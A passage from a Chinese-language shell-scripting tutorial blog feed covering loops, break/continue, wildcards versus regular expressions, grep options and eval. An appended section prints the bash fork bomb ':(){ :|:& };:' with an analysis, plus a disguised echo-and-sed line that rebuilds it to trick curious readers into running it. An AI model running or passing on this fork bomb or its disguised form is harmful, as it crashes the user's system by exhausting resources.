class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> looping...                                                                                                                    </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p></blockquote><p>上面的<code>:</code>是bash的null command，不做任何动作，除了返回true的return value。<br>因此这个循环不会结束，称作死循环。<br>死循环的产生有可能是故意设计的(如跑daemon)，也可能是设计的错误。<br>若要结束死循环，可通过signal来终止(如按下ctrl-c)，<br>(关于process与signal，等日后有机会再补充，十五问略过。)</p><h3 id="3-until-loop"><a href="#3-until-loop" class="headerlink" title="3.until loop"></a>3.until loop</h3><hr><p>一旦你能够理解<code>while</code> loop的话，那就能理解<code>until</code> loop:<br>与<code>while</code>相反， <code>until</code>是在return value 为false时进入循环，否则，结束。<br>因此，前面的例子，我们也可以轻松的用<code>until</code>来写：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num=1</span><br><span class="line">until [ ! <span class="string">"<span class="variable">$num</span>"</span> -le 10 ]; <span class="keyword">do</span>                                                                                                              </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"num is <span class="variable">$num</span>"</span>                                                                                                                 </span><br><span class="line">        num=$((<span class="variable">$num</span> + 1))                                                                                                                  </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>或者：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num=1</span><br><span class="line"></span><br><span class="line">until [ <span class="string">"<span class="variable">$num</span>"</span> -gt 10 ]; <span class="keyword">do</span>                                                                                                                </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"num is <span class="variable">$num</span>"</span>                                                                                                                 </span><br><span class="line">        num=$((<span class="variable">$num</span> + 1))                                                                                                                  </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>ok, 关于bash的三个常用的loop暂时介绍到这里。</p><h3 id="4-shell-loop中的break与continue"><a href="#4-shell-loop中的break与continue" class="headerlink" title="4. shell loop中的break与continue"></a>4. shell loop中的break与continue</h3><hr><p>在结束本章之前，再跟大家补充两个loop有关的命令：</p><ul><li><code>break</code></li><li><code>continue</code></li></ul><p>这两个命令常用在复合式循环里，也就是<code>do ... done</code>之间又有更进一层的loop，当然，用在单一循环中也未尝不可啦… ^_^<br><code>break</code>用来中断循环，也就是强迫结束循环。<br>若<code>break</code>后面指定一个数值n的话，则从里向外中断第n个循环，预设值为 <code>break 1</code>，也就是中断当前循环。<br>在使用break时，需要注意的是，它与<code>return</code>及<code>exit</code>是不同的：</p><ul><li><code>break</code>是结束loop；</li><li><code>return</code>是结束function；</li><li><code>exit</code>是结束script/shell;</li></ul><p>而<code>continue</code>则与<code>break</code>相反：强迫进入下一次循环动作。<br>若你理解不来的话，那你可简单的看成：<br>在<code>continue</code>在<code>done</code>之间的句子略过而返回到循环的顶端。<br>与<code>break</code>相同的是：<code>continue</code>后面也可以指定一个数值n，以决定继续哪一层(从里往外计算)的循环，预设值为 <code>continue 1</code>,也就是继续当前的循环。<br>在shell script设计中，若能善用loop，将能大幅度提高script在复杂条件下的处理能力。<br>请多加练习吧…^_^</p><h2 id="shell十五问之14-跟-差在哪？-wildcard-通配符篇。"><a href="#shell十五问之14-跟-差在哪？-wildcard-通配符篇。" class="headerlink" title="shell十五问之14: [^ ] 跟[! ]差在哪？ (wildcard)通配符篇。"></a>shell十五问之14: [^ ] 跟[! ]差在哪？ (wildcard)通配符篇。</h2><hr><p>这个题目说穿了，就是要探讨Wildcard（通配符）与Regular Expression（正则表达式）的差别的。<br>这也是很多初学shell的朋友很容易混淆的地方。<br>首先，让我们回到十五问之第2问，再一次将我们提到的command line format 温习一次：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command_name options arguments</span><br></pre></td></tr></table></figure><p>同时，也再来理解一下，我在第5章所提到的变量替换的特性：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先替换，再重组 command line!</span><br></pre></td></tr></table></figure></p><p>有了这个两个基础后，再让我们来看Wildcard是什么回事吧。</p><h3 id="1-Wildcard-（通配符）"><a href="#1-Wildcard-（通配符）" class="headerlink" title="1.Wildcard （通配符）"></a>1.Wildcard （通配符）</h3><hr><p>首先<code>Wildcard</code> 也是属于 <code>command line</code> 的处理工序，作用于 <code>arguments</code> 里的 <code>path</code> 之上。<br>没错，它不用在<code>command_name</code>，也不用在<code>options</code>上。<br>而且，若argument不是path的话，那也与wildcard无关。<br>换句更为精确的定义来讲，<code>wildcard</code>是一种命令行的路径扩展(path expansion)功能。<br>提到这个扩展，那就不要忘了command line的重组特性了！<br>是的，这与<code>变量替换</code>(variable subtitution)及<code>命令替换</code>(command substitution)的重组特性是一样的。<br>也就是在<code>wildcard</code>进行扩展后，命令行会先完成重组，才会交给shell来处理。<br>了解了<code>wildcard</code>的扩展与重组特性后，接下来，让我们了解一些常见的wildcard通配符吧。 </p><table><thead><tr><th>wildcard</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>匹配0个或多个字符</td></tr><tr><td>?</td><td>匹配任意单一字符</td></tr><tr><td>[list]</td><td>匹配list中任意单一字符</td></tr><tr><td>[!list]</td><td>匹配不在list中任意单一字符</td></tr><tr><td>{string1,string2,…}</td><td>匹配string1或者stsring2或者(…)中其一字符串</td></tr></tbody></table><p>Note:</p><blockquote><p> list 中可以指定单个字符，如abcd, 也可以指定ASCII字符的起止范围，如 a-d。<br> 即[abcd] 与 [a-d] 是等价的，称为一个自定义的字符类。</p></blockquote><p>例如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a*b     # a 与 b 之间可以有任意个字符（0个或多个），如aabcb, axyzb, a012b,ab等。</span><br><span class="line">a?b     # a 与 b 之间只能有一个字符，但该字符可以任意字符，如 aab, abb, acb, azb等。</span><br><span class="line">a[xyz]b # a 与 b 之间只能有一个字符，但这个字符只能是x或者y或者z，如：axb, ayb, azb这三个。</span><br><span class="line">a[!0-9]b# a 与 b 之间只能有一个字符，但这个字符不能是阿拉伯数字，如aab，ayb，a-b等。</span><br><span class="line">a&#123;abc,xyz,123&#125;b # a 与 b之间只能是abc或者xyz或者123这三个字串之一，扩展后是aabcb，axyzb，a123b。</span><br></pre></td></tr></table></figure></p><ol><li><p><code>[! ]</code> 中的<code>!</code> 只有放在第一位时，才有取反的功效。<br>举例:<br> <code>[!a]*</code> 表示当前目录下不以<code>a</code>开头的路径名称；<br> <code>/tmp/[a\!]*</code>表示/tmp目录下所有以<code>a</code> 或者 <code>!</code> 开头的路径名称；</p><p> 思考：为何<code>!</code>前面要加<code>\</code>呢？</p></li><li><p><code>[ - ]</code>中<code>-</code>左右两边均有字符时，才表示一个范围，否则,仅作<code>-</code>(减号)字符来处理。<br>举例：<br> <code>/tmp/*[-z]/[a-zA-Z]*</code> 表示/tmp目录下所有以<code>z</code>或者<code>-</code>结尾的子目录中，以英文字母(不分大小写)开头的目录名称。</p></li><li><p>以*或?开头的wildcard不能匹配隐藏文件(即以.开头的文件名)。<br>举例:<br> <code>*.txt</code>并不能匹配<code>.txt</code>但能匹配1.txt这样的路径名。<br> 但<code>1*txt</code>及<code>1?txt</code>均可匹配1.txt这样的路径名。</p></li></ol><p>基本上，要掌握wildcard并不难，只要多加练习，再勤于思考，就能灵活运用了。</p><p><strong>再次提醒：</strong></p><blockquote><p>别忘了wildcard的”扩展” + “重组” 这个重要特性，而且只作用在 argument的path上。</p></blockquote><p>比方说，假如当前目录下有：a.txt b.txt c.txt 1.txt 2.txt 3.txt 这几个文件。<br>当我们在命令行中执行<code>ls -l [0-9].txt</code>的命令行时，因为wildcard处于argument的位置上，于是根据匹配的路径，扩展为: 1.txt 2.txt 3.txt，在重组出<code>ls -l 1.txt 2.txt 3.txt</code> 这样的命令行。<br>因此，你在命令行上敲 <code>ls -l [0-9].txt</code> 与 <code>ls -l 1.txt 2.txt 3.txt</code> 输出的结果是一样，原因就是在于此。</p><h2 id="shell十五问之15-跟-差在哪？-RE-Regular-Expression）正则表达式篇"><a href="#shell十五问之15-跟-差在哪？-RE-Regular-Expression）正则表达式篇" class="headerlink" title="shell十五问之15: [^ ] 跟[! ]差在哪？ (RE: Regular Expression）正则表达式篇"></a>shell十五问之15: [^ ] 跟[! ]差在哪？ (RE: Regular Expression）正则表达式篇</h2><hr><h3 id="2-Regular-Expression-正则表达式"><a href="#2-Regular-Expression-正则表达式" class="headerlink" title="2.Regular Expression (正则表达式)"></a>2.Regular Expression (正则表达式)</h3><hr><p>接下来的Regular Expression(RE) 可是个大题目，要讲的很多。<br>我这里当然不可能讲得很全。<br>只希望能带给大家一个基本的入门概念，就很足够了。<br>先来考一下英文好了：What is expression?<br>简单来说，就是<strong>表达</strong>，也就是人们在沟通的时候所要陈述的内容。<br>然而，生活中，表达方要清楚的将意思描述清楚，而让接收方完整无误地领会，可不是件容易的事情。<br>因而才会出现那么多的误会, 真可叹句表达不易啊。<br>同样的情形也发生在计算机的数据处理过程中，尤其是当我们在描述一段文字内容的时候。<br>那么，我们不禁要问：<br>有何方法可以让大家的误会降至最低程度，而让表达的精确度达到最高程度呢？<br>答案就是<strong>标准化</strong>了，也就是我们这里要谈的<code>Regular Expression</code>啦…^_^<br>然而，在进入<code>RE</code>介绍之前，不妨先让我们温习一下shell十五问之第4问，那就是关于quoting的部分。<br><strong>关键是要能够区分 shell command line上的meta与literal的这两种不同的字符类型</strong>。<br>然后，我这里也跟你讲：</p><blockquote><p>RE 表达式里字符也分meta与literal这两种。</p></blockquote><p>呵，不知亲爱的读者是否被我搞混乱了呢？… ^_^<br>这也难怪啦，因为这的确是最容易混淆的地方，刚学<code>RE</code>的朋友很多时候，都死在这里！<br>因此，请特别小心理解哦。<br>简单而言，除非你将<code>RE</code>写在特定程序使用的脚本里，否则，我们的<code>RE</code>也是通过 command line输入的。<br>然而，<strong>不少RE所使用的meta字符，跟shell 的meta字符是冲突的</strong>。<br>比方说，<strong><code>*</code>这个字符，在RE里是一个modifier(修饰符);而在command line上，确是wildcard(通配符)</strong>。<br>那么，我们该如何解决这样的冲突呢？<br>关键就是看你对shell十五问的第4问中所提的quoting是否足够理解了！<br>若你明白<strong>shell quoting 就是用来在command line上关闭shell meta这一基本原理</strong>，那你就能很轻松的解决 RE meta与shell meta的冲突问题了：</p><blockquote><p>用shell quoting 关闭掉shell meta就是了。<br>就这么简单… ^_^<br>再以刚提到<code>*</code>字符为例，若在command line的path中没有quoting处理的话，如abc* 就会被作为wildcard expression来扩充及重组了。<br>若将其置于quoting中，即”abc*“，则可以避免wildcard expand的处理。</p></blockquote><p>好了，说了大半天，还没有进入正式的RE介绍呢。<br>大家别急，因为我的教学风格就是要先建立基础，循序渐进的… ^_^<br>因此, 我这里还要再啰嗦一个观念，才会到RE的说明啦…(哈…别打我…)</p><p>当我们在谈到RE时，千万别跟wildcard搞混在一起！<br>尤其是在command line的位置里，wildcard只作用于argument的path上；<br>而RE却只用于字符串处理的程序中，这与路径名一点关系也没有。</p><blockquote><p> <strong>Tips:</strong><br> RE 所处理的字符串，通常是指纯文本或通过stdin读进的内容。</p></blockquote><p>ok，够了够了，我已看到一堆人开始出现不耐烦的样子了… ^<em>^<br>现在，就让我们登堂入室，揭开RE的神秘面纱吧，这样可以放过我了吧？ 哈哈…^</em>^</p><p>在RE的表达式里，主要分为两种字符：<code>literal</code>与<code>meta</code>。<br>所谓<code>literal</code>就是在RE里不具有特殊功能的字符，如abc，123等；<br>而<code>meta</code>,在RE里具有特殊的功能。<br>要关闭之，需要在<code>meta</code>之前使用escape(<code>\</code>)转义字符。</p><p>然而，在介绍<code>meta</code>之前，先让我们来认识一下字符组合(character set)会更好些。<br>一、所谓的char set就是将多个连续的字符作为一个集合。<br>如 abc|xyz 表示abc或xyz这连个char set之一。<br>其它含义如下：</p><table><thead><tr><th>char set</th><th>意义</th></tr></thead><tbody><tr><td>abc</td><td>表示abc三个连续的字符，但彼此独立而非集合。(可简单视为三个char set)</td></tr><tr><td>(abc)</td><td>表示abc这三个连续字符的集合。(可简单视为一个char set)</td></tr><tr><td>[abc]</td><td>表示单一字符，可为a或b或c;与wildcard的[abc]原理相同，称之为字符类。</td></tr><tr><td>[^abc]</td><td>表示单一字符，不为a或b或c即可。(与wildcard [!abc]原理相同)</td></tr><tr><td>.</td><td>表示任意单个字符，(与wildcard的?原理相同)</td></tr></tbody></table><p>在认识了RE的char set这个概念之后，然后，在让我们多认识几个RE中常见的meta字符：</p><p>二、 锚点(anchor): 用以标识RE在句子中的位置所在。<br>常见的有：  </p><table><thead><tr><th>锚点</th><th>说明</th></tr></thead><tbody><tr><td>^</td><td>表示句首。如，^abc表示以abc开头的句子。</td></tr><tr><td>$</td><td>表示句尾。如，abc$表示以abc结尾的句子。</td></tr><tr><td>\&lt;</td><td>表示词首。如，\&lt;abc表示以abc开头的词。</td></tr><tr><td>></td><td>表示词尾。如，abc>表示以abc结尾的词。</td></tr></tbody></table><p>三、 修饰符(modifier)：独立表示时本身不具意义，专门用以修饰前一个char set出现的次数。<br>常见的有：</p><table><thead><tr><th>modifier</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>表示前一个char set出现0次或多次，即任意次。如ab*c表示a与c之间可以有0个或多个b。</td></tr><tr><td>?</td><td>表示前一个char set出现0次或1次，即至多出现1次。如ab?c 表示a与c之间可以有0个或1个b。</td></tr><tr><td>+</td><td>表示前一个char set出现1次或多次，即至少出现1次。如ab+c 表示a与c之间可以有1个或多个b。</td></tr><tr><td>{n}</td><td>表示前一个char set出现n次。如ab{n}c 表示a与c之间可以有n个b。</td></tr><tr><td>{n, }</td><td>表示前一个char set至少出现n次。如ab{n}c 表示a与c之间至少有n个b。</td></tr><tr><td>{n, m}</td><td>表示前一个char set至少出现n次，至多出现m次。如ab{n，m}c 表示a与c之间至少有n个b，至多有m个b。</td></tr></tbody></table><p>然而，当我们在识别modifier时，却很容易忽略”边界(boundary)字符”的重要性。</p><p>以<code>ab{3,5}c</code>为例，这里的a与c就是边界字符了。<br>若没有边界字符的帮忙，我们很容易做出错误的解读。<br>比方说: 我们用<code>ab{3,5}</code>这个RE（少了c这个边界字符)<br>可以抓到”abbbbbbbbbb”(a后面有10个b)的字符串吗？<br>从刚才的modifier的说明，我们一般认为，我们要的b是3到5个，若超出了此范围，就不是我们所要表达的。<br>因此，我们或许会很轻率地认为这个RE抓不到结果（上述”abbbbbbbbbb”字符串）。</p><p>然而，答案却是可以的！为什么呢？<br>让我们重新解读<code>ab{3,5}</code>这个RE看看：<br>我们要表达的是a后接3到5个b即可，但3到5个b后面，我们却没有规定什么，因此，在RE后面可以是任意的字符串，当然包括b也可以啦！(明白了吗？)</p><p>同样，我们用<code>b{3,5}c</code>也同样可以抓到”abbbbbbbbbbc”这样的字符串。</p><p>但当我们用<code>ab{3,5}c</code>这样的RE时，由于同时有a与c这连个边界字符，就截然不同了！</p><p>有空在思考一下，为何我们用下面这些RE都抓到abc这样的字符串呢？<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x*</span><br><span class="line">ax*, abx*, ax<span class="number">*b</span></span><br><span class="line">abcx*, abx<span class="number">*c</span>, ax<span class="number">*bc</span></span><br><span class="line">bx<span class="number">*c</span>, bcx*, x<span class="number">*bc</span></span><br></pre></td></tr></table></figure></p><p>但, 若我们在这些RE前后分别加<code>^</code>与<code>$</code>这样的anchor，那又如何呢？</p><p>刚学RE时，只要能掌握上面这些基本的meta的大概就可以入门了。<br>一如前述，RE是一种规范化的文字表达式，<br>主要用于某些文字处理工具之间，如：<br><code>grep</code>， <code>perl</code>， <code>vi</code>，<code>awk</code>，<code>sed</code>，等等，常用于表示一段连续的字符串，查找和替换。</p><p>然而每种工具对RE表达式的具体解读或有一些细微差别，不过原理还是一致的。<br>只要掌握RE的基本原理，那就一理通百理了，只是在实践时，稍加变通即可。</p><p>比方以<code>grep</code>来说，在<code>Linux</code>上，你可以找到<code>grep</code>，<code>egrep</code>，<code>fgrep</code>这些程序，其差异大致如下：</p><p>grep： 传统的grep程序，在没有任何选项(options)的情况下，只输出符合RE字串的句子，<br> 其常见的选项如下：</p><table><thead><tr><th>选项 (option)</th><th>用途</th></tr></thead><tbody><tr><td>-v</td><td>反模式，  只输出“不含”RE的字符串的行。</td></tr><tr><td>-r</td><td>　递归模式，可同时处理所有层级的子目录里的文件</td></tr><tr><td>-q</td><td>静默模式，不输出任何结果(stderr 除外，常用于获取return value，符合为true，否则，为false.</td></tr><tr><td>-i</td><td>忽略大小写</td></tr><tr><td>-w</td><td>整词匹配，类似 \&lt;RE></td></tr><tr><td>-n</td><td>同时输出行号</td></tr><tr><td>-l</td><td>输出匹配RE的文件名</td></tr><tr><td>-o</td><td>只输出匹配RE的字符串。(gna新版独有，不见得所有版本支持)</td></tr><tr><td>-E</td><td>切换为egrep</td></tr></tbody></table><p>egrep：为grep的扩充版本，改良了许多传统grep不能或者不便的操作，</p><ul><li>grep下不支持<code>?</code>与<code>+</code>这两种meta，但egrep支持；</li><li>grep 不支持<code>a|b</code>或（<code>abc|xyz</code>）这类“或一”的匹配，但egrep支持；</li><li>grep 在处理<code>{n,m}</code>时，需要\{ 与 \}处理，但egrep不需。</li></ul><p>等诸如此类的。我个人建议能用<code>egrep</code>就不用<code>grep</code>啦…^_^</p><p>fgrep: 不作RE处理，表达式仅作一般的字符串处理，所有的meta均市区功能。</p><p>好了，关于RE的入门，我们暂时就介绍到这里。<br>虽然有点乱，且有些观念也不恨精确，不过，姑且算是对大家的一个交差吧…^_^<br>若这两天有时间的话，我在举些范例来分析一下，以帮助大家更好的理解。<br>假如更有可能的话，也顺道为大家介绍一下<code>sed</code>这个工具。</p><hr><h3 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h3><hr><p>讲到command line的重组特性，真的需要我们好好的加以解释的。</p><p>如此便能抽丝剥茧的一层层的将整个command line分析的一清二楚，而不至于含糊。</p><p>假如这个重组的特性理解了，那我们介绍一个好玩的命令：<code>eval</code>。</p><p>我们在变量替换的过程中，常会碰到所谓的复式变量的问题：<br>如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ a=1</span><br><span class="line">$ A1=abc</span><br></pre></td></tr></table></figure></p><p>我们都知道<code>echo $A1</code>就可以得到abc的结果。<br>然而，我们能否用$A$a来取代$A1，而同一样替换为abc呢？</p><p>这个问题我们可用很轻松的用<code>eval</code>来解决：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">eval</span> <span class="built_in">echo</span> \<span class="variable">$A</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure></p><p>说穿了，<code>eval</code> 只不过是在命令行完成替换重组后，在来一次替换重组罢了。就是这么简单啦^_^</p><hr><h2 id="加餐：一个能让系统shell崩溃的shell-片段"><a href="#加餐：一个能让系统shell崩溃的shell-片段" class="headerlink" title="加餐：一个能让系统shell崩溃的shell 片段"></a>加餐：一个能让系统shell崩溃的shell 片段</h2><hr><p>一个能让系统shell崩溃的shell 片段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:() &#123; :|:&amp; &#125;; :      <span class="comment"># &lt;--- 这个别乱跑！好奇会死人的！</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'十人|日一|十十o'</span> | sed <span class="string">'s/.../&amp;\n/g'</span>   <span class="comment"># &lt;--- 跟你讲就不听，再跑这个就好了。</span></span><br></pre></td></tr></table></figure><p>原来是一个bash的fork炸弹：ref：<a href="http://en.wikipedia.org/wiki/Fork_bomb" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Fork_bomb</a></p><p>整理后的代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:() &#123;</span><br><span class="line">  </span><br><span class="line">  :|:&amp;</span><br><span class="line">&#125;</span><br><span class="line">:</span><br></pre></td></tr></table></figure></p><p>代码分析：</p><blockquote><p>定义了一个 shell 函数，函数名是<code>:</code>，而这个函数体执行一个后台命令<code>:|:</code> 即冒号命令(或函数，下文会解释)的输出通过管道再传给冒号命令做输入。<br>最后一行执行“:”命令在各种shell中运行结果分析：<br>这个代码只有在 <strong>bash</strong> 中执行才会出现不断创建进程而耗尽系统资源的严重后果;<br>在 ksh (Korn shell), sh (Bourne shell)中并不会出现，在 ksh88 和传统 unix Bourne shell 中冒号不能做函数名，即便是在 unix-center freebsd 系统中的 sh 和 pdksh（ksh93 手边没有，没试）中冒号可以做函数名，但还是不会出现那个效果。<br>原因是 sh、ksh 中内置命令的优先级高于函数，所以执行“:”，总是执行内置命令“:”而不是刚才定义的那个恐怖函数。<br>但是在 <strong>bash</strong> 中就不一样，bash 中函数的优先级高于内置命令，所以执行“:”结果会导致不断的递归，而其中有管道操作，这就需要创建两个子进程来实现，这样就会不断的创建进程而导致资源耗尽。</p></blockquote><p>众所周知，bash是一款极其强大的shell，提供了强大的交互与编程功能。<br>这样的一款shell中自然不会缺少“函数”这个元素来帮助程序进行模块化的高效开发与管理。<br>于是产生了由于其特殊的特性，bash拥有了fork炸弹。<br>fork炸弹的概念：进程递归式派生（fork，亦即自我复制），以使系统拒绝服务甚至崩溃。</p><p>Jaromil在2002年设计了最为精简的一个fork炸弹的实现。</p><p><img src="https://linux7788.com/images/posts/fork_bomb.png" alt="image"></p><blockquote><p>所谓fork炸弹是一种恶意程序，它的内部是一个不断在fork进程的无限循环。</p></blockquote><blockquote><p>fork炸弹并不需要有特别的权限即可对系统造成破坏。</p></blockquote><blockquote><p>fork炸弹实质是一个简单的递归程序。</p></blockquote><blockquote><p>由于程序是递归的，如果没有任何限制，这会导致这个简单的程序迅速耗尽系统里面的所有资源。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;shell十五问之1-何为shell？&quot;&gt;&lt;a href=&quot;#shell十五问之1-何为shell？&quot; class=&quot;headerlink&quot; title=&quot;shell十五问之1: 何为shell？&quot;&gt;&lt;/a&gt;shell十五问之1: 何为shell？&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;在我们回答 &lt;code&gt;shell&lt;/code&gt;是什么东西之前，不妨让我们重新审视&lt;code&gt;使用者&lt;/code&gt;和&lt;code&gt;计算机系统&lt;/code&gt;的关系：&lt;/p&gt;
&lt;p&gt;我们知道计算机的运作不能离开硬件，但使用者却无法直接操作硬件，硬件的驱动只能通过一种称为“&lt;code&gt;操作系统&lt;/code&gt;(&lt;code&gt;OS&lt;/code&gt;，&lt;code&gt;Opertating System&lt;/code&gt;)”的软件来管控。&lt;br&gt;事实上，我们每天所谈的“&lt;code&gt;linux&lt;/code&gt;”，严格来说只是一个&lt;code&gt;操作系统&lt;/code&gt;(&lt;code&gt;OS&lt;/code&gt;),我们称之为“&lt;code&gt;内核&lt;/code&gt;(&lt;code&gt;kernel&lt;/code&gt;)”。&lt;/p&gt;
&lt;p&gt;然而，从使用者的角度来说，使用者没有办法直接操作一个&lt;code&gt;kernel&lt;/code&gt;，而是通过&lt;code&gt;kernel&lt;/code&gt;的“外壳”程序，也就是所谓的&lt;code&gt;shell&lt;/code&gt;，来与&lt;code&gt;kernel&lt;/code&gt;沟通。&lt;br&gt;这也正是&lt;code&gt;kernel&lt;/code&gt;跟&lt;code&gt;shell&lt;/code&gt;的形象命名的的关系。如图：&lt;br&gt;&lt;img src=&quot;https://linux7788.com/images/posts/kernel_shell.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;从技术的角度来说，&lt;code&gt;shell&lt;/code&gt;是一个使用者与系统的&lt;code&gt;交互界面(interface)&lt;/code&gt;,只能让使用者通过&lt;code&gt;命令行&lt;/code&gt;(&lt;code&gt;command line&lt;/code&gt;)来使用系统来完成工作。&lt;br&gt;因此，&lt;code&gt;shell&lt;/code&gt;最简单的定义就是&lt;code&gt;命令解释器&lt;/code&gt;( &lt;code&gt;Command Interpreter&lt;/code&gt;):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将使用者的命令翻译给kernel来处理；&lt;/li&gt;
&lt;li&gt;同时，将kernel的处理结果翻译给使用者。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每次当我们完成&lt;code&gt;系统登入&lt;/code&gt;(&lt;code&gt;login&lt;/code&gt;), 我们就取得一个交互模式的shell，也称之为&lt;code&gt;login shell&lt;/code&gt; 或者 &lt;code&gt;primary shell&lt;/code&gt;。&lt;br&gt;若从&lt;code&gt;进程&lt;/code&gt;(&lt;code&gt;process&lt;/code&gt;)的角度来说，我们在shell所下达的命令，均是shell所产生的&lt;code&gt;子进程&lt;/code&gt;。&lt;br&gt;这种现象，我暂可称之为&lt;code&gt;fork&lt;/code&gt;。&lt;br&gt;如果是执行&lt;code&gt;shell脚本&lt;/code&gt;(&lt;code&gt;shell script&lt;/code&gt;)的话，脚本中命令则是由另一个非交互模式的&lt;code&gt;子shell&lt;/code&gt;(&lt;code&gt;sub shell&lt;/code&gt;)来执行的。&lt;br&gt;也就是&lt;code&gt;primary shell&lt;/code&gt;产生&lt;code&gt;sub shell&lt;/code&gt;的进程，而该&lt;code&gt;sub shell&lt;/code&gt;进程再产生&lt;code&gt;script&lt;/code&gt;中所有命令的进程。&lt;br&gt; (关于进程，我们日后有机会在补充)&lt;br&gt;这里， 我们必须知道：&lt;code&gt;kernel&lt;/code&gt; 与 &lt;code&gt;shell&lt;/code&gt; 是不同的两套软件，而且都是可以被替换的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不同的&lt;code&gt;OS&lt;/code&gt;使用不同的&lt;code&gt;kernel&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;同一个kernel之上，也可以使用不同的&lt;code&gt;shell&lt;/code&gt;;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在&lt;code&gt;Linux&lt;/code&gt;的预设系统中，通常可以找到好几种不同的&lt;code&gt;shell&lt;/code&gt;,且通常会被记录在如下文件中：&lt;br&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/etc/shells&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;不同的&lt;code&gt;shell&lt;/code&gt;有着不同的功能，且彼此各异，或者说“大同小异”。&lt;br&gt;常见的&lt;code&gt;shell&lt;/code&gt;主要分为两大主流：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;sh：&lt;ul&gt;
&lt;li&gt;burne shell (sh)&lt;/li&gt;
&lt;li&gt;burne again shell (bash)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;csh：&lt;ul&gt;
&lt;li&gt;c shell (csh)&lt;/li&gt;
&lt;li&gt;tc shell (tcsh)&lt;/li&gt;
&lt;li&gt;korn shell (ksh)&lt;br&gt;(FIXME)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大部分的&lt;code&gt;Linux&lt;/code&gt;操作系统的预设&lt;code&gt;shell&lt;/code&gt;都是&lt;code&gt;bash&lt;/code&gt;，其原因大致如下两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自由软件&lt;/li&gt;
&lt;li&gt;功能强大&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;bash&lt;/code&gt;是&lt;code&gt;gnu project&lt;/code&gt;最成功的产品之一，自推出以来深受广大&lt;code&gt;Unix&lt;/code&gt;用户的喜爱，且也逐渐成为不少组织的系统标准。&lt;/p&gt;
    
    </summary>
    
      <category term="编程技能" scheme="https://linux7788.com/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/"/>
    
      <category term="Shell" scheme="https://linux7788.com/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/Shell/"/>
    
    
      <category term="linux" scheme="https://linux7788.com/tags/linux/"/>
    
      <category term="ops" scheme="https://linux7788.com/tags/ops/"/>
    
      <category term="shell" scheme="https://linux7788.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Docker容器资源限制测试</title>
    <link href="https://linux7788.com/docker/Docker_Container_Limit/"/>
    <id>https://linux7788.com/docker/Docker_Container_Limit/</id>
    <published>2017-12-03T10:10:25.000Z</published>
    <updated>2018-05-18T15:32:58.950Z</updated>
    
